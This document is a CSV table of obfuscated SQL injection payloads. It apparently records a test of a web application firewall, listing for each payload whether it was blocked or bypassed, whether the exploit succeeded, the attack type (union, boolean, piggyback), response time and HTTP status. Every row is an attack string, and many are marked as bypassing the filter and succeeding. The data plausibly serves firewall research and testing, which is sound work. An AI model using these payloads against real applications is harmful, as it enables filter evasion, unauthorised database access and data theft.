Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1.+or+not+{`if`%0b1}=1=%0b(not%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0189,73.47,No,200
0'<@!=1%0bor%0b!%0b{`if`%0b1}=1=+(!%0b{a+1}=1,Bypassed,No,None,Unknown,0.0112,73.47,No,500
0%27<@=.1+||%0b!+{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0159,73.47,No,403
0'<@=1.%0b||+!+{a%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Unknown,0.0214,73.47,No,500
0'<@!=.1+or%0b!%0b{a%0b1}=1=+(!%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0133,73.47,No,500
0'<@=.1%0bor%0b!%0b{`if`%0b1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0181,73.47,No,500
0'<@=.1%0bor%0b!+true=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,booleanAtk,0.0168,73.47,No,500
0%27<@!=1.+or+!+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0278,73.47,No,200
0'<@=.1%0bor%0bnot%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0112,73.47,No,500
0%27<@!=.1%0bor+!~false=+(!+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0136,73.47,No,200
0'<@=1.%0b||%0b!+true=+(!+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0207,73.47,No,500
0%27<@!=1.%0bor%0bnot%0b{a%0b1}=1=%0b(!%0b{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0156,73.47,No,200
0%27<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(0),Bypassed,Yes,unionAtk,Unknown,0.0189,73.47,No,200
0%27<@!=1.%0b||+not%0b{a%0b1}=1=+(not%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0135,73.47,No,200
0'<@=1.%0bor%0b!%0b{x+(select+1)}=1=%0b(not%0b{`if`,Bypassed,No,None,Unknown,0.012,73.47,No,500
0%27<@=.1%0b||%0b!%0b{a+1}=1=+(false)+||,Bypassed,Yes,unionAtk,Unknown,0.0147,73.47,No,200
0'<@=1.+||%0b!+true=%0b(not+{x%0b(select+,Bypassed,No,None,Unknown,0.0153,73.47,No,500
0%27<@=1+||+not%7efalse=%0b(not%0b{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0144,73.47,No,200
0%27<@=1+or+!+{`if`%0b1}=1=%0b(not%7efalse),Bypassed,Yes,unionAtk,booleanAtk,0.0091,73.47,No,200
0%27<@=1.+or+{x%0b(select%0b1)}=1+like+{`if`%0b1}=1+||',Bypassed,No,None,Unknown,0.0155,73.47,No,500
0'<@!=1.+||+not%0b{x+(select%0b1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.013,73.47,No,500
0'<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not%0btrue,Blocked,No,None,booleanAtk,0.0052,73.47,No,403
0'<@=1.%0bor%0b!+{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0177,73.47,No,500
0'<@=.1+or%0bnot%0b1=+(!+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0135,73.47,No,403
0%27<@!=.1%0bor%0b!%7e0=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0217,73.47,No,200
0'or+1<@.%0bor+not%0b1=%0b(not%0b{a+,Bypassed,No,None,Unknown,0.0245,73.47,No,500
0%27<@=1.+||+!+{`if`%0b1}=1=+(!%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0232,73.47,No,200
0'<@=1.+or+!+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0202,73.47,No,500
0%27<@!=1.%0b||%0b{x+(select+1)}=1%0blike%0b{a+1}=1%0bor',Bypassed,No,None,Unknown,0.0234,73.47,No,500
0%27<@=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0175,73.47,No,200
0'<@=.1+or+!+{`if`+1}=1=+(not%0b{x+,Bypassed,No,None,Unknown,0.0225,72.84,No,500
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+(0),Bypassed,Yes,unionAtk,Unknown,0.0146,72.84,No,200
0'<@=1+or%0bnot%0b{a+1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0144,72.84,No,500
0%27<@!=1+||+not+1=+(!%0b{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0202,72.9,No,200
0'<@!=1%0b||+not+{a+1}=1=+(not%0b{x%0b,Bypassed,No,None,Unknown,0.0187,73.11,No,500
0%27<@=1.%0bor%0bnot%0b1=+(!%0btrue)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0136,73.16,No,200
0%27<@!=.1%0bor+!%0btrue=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0139,73.16,No,200
0'<@!=1.+or%0b!+{x+(select+1)}=1=%0b(!+1,Blocked,No,None,Unknown,0.0126,73.4,No,403
0'<@=1.%0b||%0b!+{x%0b(select%0b1)}=1=%0b(not%0b{x,Bypassed,No,None,Unknown,0.0352,73.47,No,500
0'<@!=1.+||%0b!%0b{x%0b(select%0b1)}=1=+(not+{x,Blocked,No,None,Unknown,0.0129,73.47,No,403
0%27<@=1.+or+not%0b{x+(select+1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0087,73.47,No,200
0'<@!=1.+||%0bnot%0b1=+(!%0b1)%0bor,Bypassed,No,None,Unknown,0.0188,73.47,No,500
0'<@!=.1+or+not+{a+1}=1=%0b(not%0btrue),Bypassed,No,None,booleanAtk,0.015,73.47,No,500
0'<@=.1%0bor+not+{a%0b1}=1=%0b(not%0b{x%0b(select,Bypassed,No,None,Unknown,0.0196,73.47,No,500
0'<@=1+or%0btrue+like+{x+(select+1)}=1--+,Bypassed,No,None,piggyAtk,0.0196,73.47,No,500
0'<@=1+or+{x%0b(select+1)}=1%0blike+{x+(select+1)}=1+,Blocked,No,None,Unknown,0.0186,73.47,No,403
0'<@!=.1%0bor+not+true=%0b(not%0b{x%0b(select+1)}=1,Bypassed,No,None,booleanAtk,0.0127,73.47,No,500
0'<@!=.1%0b||%0bnot%0btrue=%0b(false)+||',Bypassed,No,None,Unknown,0.022,73.47,No,500
0%27<@!=1%0bor+!+true=+(false)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0167,73.47,No,200
0%27<@=1.+or%0bnot+{x+(select+1)}=1=%0b(not+,Blocked,No,None,Unknown,0.0063,73.47,No,403
0'||+@<@%0b||+not+{x%0b(select+1)}=1=%0b(not,Blocked,No,None,Unknown,0.0217,73.47,No,403
0%27<@!=1.+or+not+{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0259,73.47,No,200
0'<@=1.%0b||+1%0blike%0b{x%0b(select%0b1)}=1+||',Bypassed,No,None,Unknown,0.0128,73.47,No,500
0%27<@!=1%0bor%0b!+{`if`%0b1}=1=%0b(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0107,73.47,No,200
0'<@=1.%0bor+{x+(select%0b1)}=1%0blike%0b{x%0b(select+1)}=1+,Bypassed,No,None,Unknown,0.0217,73.47,No,500
0'<@=1%0b||%0b!%0b{x%0b(select+1)}=1=+(not%0b{a,Bypassed,No,None,Unknown,0.0129,73.47,No,500
0'<@=1.+||+not%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.012,73.47,No,500
0%27<@=.1%0bor+!%0b{x+(select+1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0145,73.47,No,200
0%27<@=.1%0b||%0b!%0b{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0109,73.47,No,200
0%27<@!=1.%0bor+not+true=+(not%7e0)%0b||,Bypassed,Yes,unionAtk,booleanAtk,0.013,73.47,No,200
0%27or%0b1<@%0b||+not%0b{x+(select+1)}=1=+(not,Blocked,No,None,Unknown,0.0087,73.47,No,403
0%27<@=1.+||+not%0b{`if`+1}=1=+(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0124,73.47,No,200
0'<@!=.1%0bor%0bnot%0b{x+(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0084,73.47,No,500
0'<@=1.+or%0b!+{x+(select%0b1)}=1=%0b(not%7efalse,Blocked,No,None,booleanAtk,0.0076,73.47,No,403
0'<@=1%0b||+!+{`if`+1}=1=+(not%0b1),Bypassed,No,None,Unknown,0.0212,73.47,No,500
0%27<@=1.+||+not+1=+(!+{`if`%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.012,73.47,No,200
0'<@=1.+||%0b!~false=%0b(not%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.023,73.47,No,500
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0093,73.47,No,403
0'<@!=1%0bor%0bnot%0b1=+(!+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.02,73.47,No,500
0%27<@!=1%0bor%0bnot%0b{x+(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0225,73.47,No,200
0%27<@=1.+or+not+{x%0b(select+1)}=1=%0b(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0223,73.47,No,200
0'<@!=1.+or+!+{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0152,73.47,No,500
0'<@!=1+||+not+1=%0b(!%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0231,73.47,No,500
0%27<@!=1%0bor%0b!+{x%0b(select+1)}=1=+(not%0b1,Bypassed,Yes,unionAtk,Unknown,0.012,73.47,No,200
0%27<@!=1%0b||%0b!+{x+(select%0b1)}=1=%0b(not+true,Bypassed,Yes,unionAtk,Unknown,0.0306,73.47,No,200
0'<@=1%0b||+not%0b{`if`+1}=1=+(not+1),Bypassed,No,None,Unknown,0.0195,73.47,No,500
0'<@!=1%0bor%0bnot%0b{a+1}=1=+(!%0b{a+1}=1,Bypassed,No,None,Unknown,0.0263,73.47,No,500
0'<@=1.%0b||+not+{x%0b(select%0b1)}=1=+(!%0b,Bypassed,No,None,Unknown,0.023,73.47,No,500
0%27<@=1+||%0bfalse=+(not%0b{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0247,73.47,No,200
0%27<@=1+||+!+{x+(select+1)}=1=%0b(not~,Blocked,No,None,Unknown,0.0141,73.47,No,403
0'<@!=1%0bor+not%0b{x+(select%0b1)}=1=%0b(not+1,Bypassed,No,None,Unknown,0.0195,73.47,No,500
0%27<@=1.%0b||+not+{x+(select+1)}=1=%0b(0),Bypassed,Yes,unionAtk,Unknown,0.0163,73.47,No,200
0%27<@=1.%0bor%0bnot%0b{a+1}=1=+(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0256,73.47,No,200
0'<@!=.1%0bor+not+{`if`+1}=1=+(!+{a+1}=1,Bypassed,No,None,Unknown,0.018,73.47,No,500
0%27<@=1%0bor%0bnot+1=%0b(!+{x%0b(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0131,73.47,No,200
0'<@=1%0bor%0bnot~0=+(!~0)--%0b,Bypassed,No,None,piggyAtk,0.019,73.47,No,500
0'<@!=1+or%0b!+{`if`%0b1}=1=%0b(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0141,73.47,No,500
0'<@=.1+or+!+{a+1}=1+is+false%0bor',Blocked,No,None,booleanAtk,0.0189,73.47,No,403
0%27<@=1+||+true+like+{x+(select%0b1)}=1%0bor%27,Blocked,No,None,booleanAtk,0.0139,73.47,No,403
0%27<@!=1+or%0b!+{x+(select%0b1)}=1=+(!+true,Blocked,No,None,booleanAtk,0.0109,73.47,No,403
0'<@!=1.%0b||%0bnot+{`if`%0b1}=1=+(!%0b{`if`+,Bypassed,No,None,Unknown,0.019,73.47,No,500
0%27<@!=1.+or+!+{`if`%0b1}=1=+(!%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0151,73.47,No,200
0'<@=.1+||+not%0b{`if`+1}=1=+(!%0b{a+1}=1,Bypassed,No,None,Unknown,0.0125,73.47,No,500
0%27+or+true%0blike+{x%0b(select+1)}=1+or%270,Blocked,No,None,booleanAtk,0.0089,73.47,No,403
0'<@=.1+or+!+{x%0b(select+1)}=1=+(!%0b,Bypassed,No,None,Unknown,0.0152,73.47,No,500
0'<@!=1+or+not+{x+(select%0b1)}=1=%0b(not+true,Blocked,No,None,booleanAtk,0.0158,73.47,No,403
0'<@!=1+or%0bnot+1%0bis+false%23,Bypassed,No,None,piggyAtk,0.0153,73.47,No,500
0'<@=1.+||%0bnot+{x+(select+1)}=1=+(!%0b{`if`,Blocked,No,None,Unknown,0.0077,73.47,No,403
0%27<@=.1%0bor%0b!+{`if`%0b1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0096,73.47,No,200
0'<@=1.+or+not+true=%0b(not%0btrue)+or,Bypassed,No,None,booleanAtk,0.0142,73.47,No,500
0%27<@=.1+or+!+{x+(select%0b1)}=1=+(!%0b{a,Blocked,No,None,Unknown,0.0038,73.47,No,403
0%27<@!=1.%0b||%0b!+{`if`+1}=1=%0b(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.021,73.47,No,200
0%27<@=1+or%0bnot%0b{x%0b(select+1)}=1=%0b(!%0btrue,Bypassed,Yes,unionAtk,booleanAtk,0.0165,73.47,No,200
0%27<@!=.1%0bor+not~0=+(!+{x%0b(select+,Bypassed,Yes,unionAtk,Unknown,0.0108,73.47,No,200
0'or%0b!@<@.%0bor+not+{x%0b(select+1)}=1=%0b(not,Bypassed,No,None,Unknown,0.0179,73.47,No,500
0'<@=1+or%0b!+{`if`%0b1}=1+is%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.018,73.47,No,500
0'<@!=1+or%0bnot~0=+(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0209,73.47,No,403
0%27<@=1+or%0b!~0=%0b(not%0b{a+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0143,73.47,No,200
0'<@!=1.%0bor%0bnot+{a%0b1}=1=%0b(not+true),Bypassed,No,None,booleanAtk,0.0232,73.47,No,500
0%27<@=.1%0b||%0bnot%0b{a%0b1}=1=+(false)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0138,73.47,No,200
0%27<@=1+or+not+{x+(select+1)}=1=%0b(0),Blocked,No,None,Unknown,0.0083,73.47,No,403
0%27<@=.1%0b||%0b!~false=+(not%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0154,73.47,No,200
0'<@!=1.%0bor+true%0blike%0b{`if`+1}=1+||%27,Bypassed,No,None,booleanAtk,0.016,73.47,No,500
0%27or%0b!@<@.%0bor+{a+1}=1+like+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.018,73.47,No,200
0%27<@!=.1+||+not%7e0=%0b(!~false)%0b||,Bypassed,Yes,unionAtk,Unknown,0.0401,73.47,No,200
0'or+@<@.%0bor%0b!~false=+(!%0b{a%0b,Bypassed,No,None,booleanAtk,0.0278,73.47,No,500
0%27<@=.1%0bor+not~false=+(!+{a+1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0207,73.47,No,200
0'<@=1+||+!%0b{x%0b(select%0b1)}=1=%0b(not~0,Bypassed,No,None,Unknown,0.0196,73.47,No,500
0'<@!=1+or%0bnot+{x%0b(select%0b1)}=1=+(not+{`if`,Bypassed,No,None,Unknown,0.0141,73.47,No,500
0'<@!=1.+or+{`if`%0b1}=1+like+{x+(select%0b1)}=1%0b||',Bypassed,No,None,Unknown,0.047,73.47,No,500
0'<@=1+or+not+{x%0b(select+1)}=1=+(not+1,Bypassed,No,None,Unknown,0.0147,73.47,No,500
0%27<@=1+or%0b!+{`if`+1}=1=+(not+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0196,73.47,No,200
0%27<@=1.+||+not%0b{`if`+1}=1=+(!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0304,73.47,No,200
0'<@!=1.%0b||%0bnot+{x+(select+1)}=1=+(not%0b{x,Bypassed,No,None,Unknown,0.0231,73.47,No,500
0'<@!=1+or+not%0b{a+1}=1=%0b(!+{x%0b,Bypassed,No,None,Unknown,0.0191,73.49,No,500
0'<@=1+||%0b!%0b{x%0b(select+1)}=1=+(0),Blocked,No,None,Unknown,0.0183,73.55,No,403
0%27or+!@<@.%0bor+!+{x%0b(select%0b1)}=1=+(!,Bypassed,Yes,unionAtk,Unknown,0.0251,73.56,No,200
0%27<@=1.+or%0bnot+{x+(select%0b1)}=1=+(not~0,Blocked,No,None,Unknown,0.0075,73.56,No,403
0'<@=1.%0bor+not%0b{x%0b(select%0b1)}=1=+(!~false,Bypassed,No,None,booleanAtk,0.0206,73.56,No,500
0'||%0b@<@.+or+!+{x%0b(select+1)}=1=+(,Bypassed,No,None,Unknown,0.0146,73.56,No,500
0%27<@!=.1%0b||%0bnot+{`if`+1}=1=+(!%0b{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0166,73.47,No,200
0'<@!=.1%0b||+false=%0b(not%0b1)+or',Bypassed,No,None,booleanAtk,0.0124,73.47,No,500
0'<@=1.+or%0bnot+{a%0b1}=1=+(!%0btrue),Bypassed,No,None,booleanAtk,0.0255,73.47,No,500
0%27<@!=1+||+{x+(select%0b1)}=1%0blike+{`if`+1}=1+or%27,Blocked,No,None,Unknown,0.009,73.47,No,403
0'<@!=.1%0b||+!~0=+(not%0b{a+1}=1),Bypassed,No,None,Unknown,0.0205,73.47,No,500
0'<@=1+or+not~false=%0b(not~false)+||,Bypassed,No,None,booleanAtk,0.0158,73.47,No,500
0'<@=.1+or%0b!+{x%0b(select+1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0223,73.47,No,500
0%27<@!=1.+||%0btrue+like+{x+(select%0b1)}=1+or%27,Bypassed,Yes,unionAtk,booleanAtk,0.0172,73.47,No,200
0%27<@=1+or+!%0b{a%0b1}=1=+(not~false),Bypassed,Yes,unionAtk,booleanAtk,0.0231,73.47,No,200
0%27<@!=1.%0b||+not+{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0168,73.47,No,200
0%27<@=1.%0b||+not%7e0=%0b(!+{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0143,73.47,No,200
0%27<@=1+||+not+{x+(select+1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0046,73.47,No,403
0'<@=1.%0b||+not+{x+(select%0b1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0348,73.47,No,500
0%27<@!=.1+or%0b!+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0074,73.47,No,403
0'<@=.1+||+!%0b{x+(select%0b1)}=1=+(0),Bypassed,No,None,Unknown,0.0123,73.47,No,500
0%27<@!=1.%0b||+not+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0184,73.47,No,200
0%27<@!=1.%0bor+!+{`if`+1}=1=+(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0233,73.47,No,200
0%27<@!=.1%0b||+not%0b{x%0b(select%0b1)}=1=+(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0149,73.47,No,200
0%27<@!=.1+||+not+1=+(!+{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0175,73.47,No,200
0%27<@=1.+||+not%0b{x%0b(select+1)}=1=+(!%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0245,73.47,No,200
0'<@=1.%0b||+not%0b{a+1}=1=%0b(not+{a%0b1}=1,Bypassed,No,None,Unknown,0.0148,73.47,No,500
0%27<@!=1.+or%0bfalse=+(not+{x%0b(select+1)}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0148,73.47,No,200
0%27<@=1.+||%0b{x+(select%0b1)}=1%0blike+{x%0b(select+1)}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0137,73.55,No,200
0'<@!=1.+or+not+1=%0b(not+{x%0b(select%0b,Bypassed,No,None,Unknown,0.0137,73.55,No,500
0'<@=1%0bor+!%0b{x+(select%0b1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.0138,73.56,No,500
0'<@=1+||+{a%0b1}=1+like+{x%0b(select+1)}=1+or',Bypassed,No,None,Unknown,0.0224,73.56,No,500
0%27<@!=1.+or+!%0b{`if`+1}=1=+(!%0b{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.014,73.56,No,200
0'||+1<@.%0b||%0b!%0b1=%0b(!%0b{a+,Bypassed,No,None,Unknown,0.0204,73.56,No,500
0'<@!=.1+||+!%0b{x%0b(select%0b1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.0263,73.56,No,500
0'<@=.1%0bor+not+{x+(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0146,73.56,No,500
0%27<@=1.+||+not+{`if`%0b1}=1=%0b(0)+or,Bypassed,Yes,unionAtk,Unknown,0.0195,73.56,No,200
0%27<@!=1+or%0bnot+{x%0b(select+1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0183,73.56,No,200
0'<@!=.1+or%0b!+{x%0b(select%0b1)}=1=%0b(not%0b,Bypassed,No,None,Unknown,0.0189,73.56,No,500
0%27<@!=.1%0b||%0bnot%0b{x%0b(select+1)}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0207,73.56,No,200
0%27<@!=1+or+not%0btrue=%0b(not+true)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0172,73.56,No,200
0'<@=1%0bor+not%0b{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0164,73.56,No,500
0%27<@!=.1+or%0b!%0b{a+1}=1=%0b(not+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0308,73.56,No,200
0'<@=1.%0b||+false=%0b(not%0b{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0198,73.56,No,500
0'<@!=1.+or+{x%0b(select+1)}=1+like+{x+(select%0b1)}=1%0b,Blocked,No,None,Unknown,0.0201,73.56,No,403
0%27<@!=.1%0b||+1+like%0b{`if`+1}=1--+,Bypassed,Yes,unionAtk,piggyAtk,0.0101,73.56,No,200
0%27<@=1+or%0b!+{a%0b1}=1=+(!+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0142,73.56,No,200
0'<@!=.1%0bor%0b!+{x%0b(select%0b1)}=1=+(not%0btrue,Bypassed,No,None,booleanAtk,0.0099,73.56,No,500
0%27<@=1.+or+not%0b{a+1}=1=+(!+{a+,Bypassed,Yes,unionAtk,Unknown,0.0231,73.56,No,200
0'<@=.1+||%0b!%0b1=+(not%0btrue)%0b||,Bypassed,No,None,Unknown,0.0156,73.56,No,500
0'<@!=1+||%0bnot%0b{x+(select+1)}=1=+(not%0b{`if`,Blocked,No,None,Unknown,0.0108,73.56,No,403
0%27<@=1+||+!~0=+(not%7e0)+or,Bypassed,Yes,unionAtk,Unknown,0.0148,73.56,No,200
0%27<@!=1.+||+false=%0b(!%0b{`if`+1}=1)+||,Bypassed,Yes,unionAtk,Unknown,0.0099,73.56,No,200
0%27<@!=.1+or+!+{x%0b(select%0b1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0223,73.56,No,200
0%27<@=1+or+!+{`if`+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0091,73.56,No,200
0'<@=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not+{a,Blocked,No,None,Unknown,0.0052,73.56,No,403
0'<@=1+||%0bnot+{x%0b(select+1)}=1=%0b(!%0b{a,Bypassed,No,None,Unknown,0.015,73.47,No,500
0%27<@=1.+or%0b!+{`if`+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0321,73.47,No,200
0%27<@!=.1+or%0bnot%0b{x%0b(select+1)}=1=+(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0118,73.47,No,200
0%27<@=.1%0b||%0b{x+(select+1)}=1%0blike+{a+1}=1%0b||%27,Bypassed,Yes,unionAtk,Unknown,0.0124,73.47,No,200
0%27<@!=.1+or%0b{`if`+1}=1+like+1+or%27,Bypassed,Yes,unionAtk,Unknown,0.0188,73.47,No,200
0'<@!=.1%0bor+not+true=%0b(not%0b{`if`+1}=1),Bypassed,No,None,booleanAtk,0.0118,73.47,No,500
0%27<@=.1%0bor%0bnot%0b{a+1}=1=+(not%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0213,73.47,No,200
0%27<@=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0138,73.47,No,200
0%27<@!=.1+||%0b!%0b1=%0b(!+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0197,73.47,No,200
0'<@=1.%0b||%0bnot+{x+(select%0b1)}=1=+(not+{`if`,Bypassed,No,None,Unknown,0.0176,73.47,No,500
0%27<@!=1.+or+not%0b{x+(select+1)}=1=+(not+{a,Bypassed,Yes,unionAtk,Unknown,0.0161,73.47,No,200
0'<@!=.1+or%0b0=+(!+{x+(select+1)}=1),Blocked,No,None,Unknown,0.0144,73.47,No,403
0%27<@!=.1%0bor%0b!%0b{x+(select+1)}=1=%0b(not+true,Bypassed,Yes,unionAtk,booleanAtk,0.0281,73.47,No,200
0%27<@=1.+or+not%0b{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0175,73.47,No,200
0'<@!=1+or+!+{x+(select%0b1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0209,73.47,No,403
0'<@!=1%0b||%0bnot+{a+1}=1=%0b(not%0b{x+,Bypassed,No,None,Unknown,0.0208,73.47,No,500
0%27<@=1%0bor+!+{x%0b(select+1)}=1=%0b(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0195,73.47,No,200
0%27<@=1+||+not+{a+1}=1=%0b(!%0btrue),Bypassed,Yes,unionAtk,Unknown,0.0339,73.47,No,200
0'<@!=1%0bor%0bnot%0b{x+(select+1)}=1=+(!%0b{x,Bypassed,No,None,Unknown,0.0228,73.47,No,500
0%27<@=1%0b||%0bnot%0b{`if`+1}=1=+(!%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0185,73.47,No,200
0'<@=1+or+not+{x+(select%0b1)}=1=+(not%0b,Blocked,No,None,Unknown,0.0144,73.49,No,403
0%27<@!=1.%0b||+not%0btrue=+(!%7efalse)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0138,73.55,No,200
0'<@=1.+||+!+{x%0b(select+1)}=1=%0b(!%0b{`if`,Bypassed,No,None,Unknown,0.0135,73.55,No,500
0%27<@!=1+or+not%0b{x+(select+1)}=1=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0137,73.56,No,200
0%27<@=.1%0b||+not+{a+1}=1=%0b(!+1),Bypassed,Yes,unionAtk,Unknown,0.0185,73.56,No,200
0'<@=1.%0bor%0bnot%0b{x%0b(select+1)}=1=+(not+true,Bypassed,No,None,booleanAtk,0.0254,73.56,No,500
0'<@!=1+or+{x+(select%0b1)}=1+like+true--%0b,Blocked,No,None,piggyAtk,0.0192,73.56,No,403
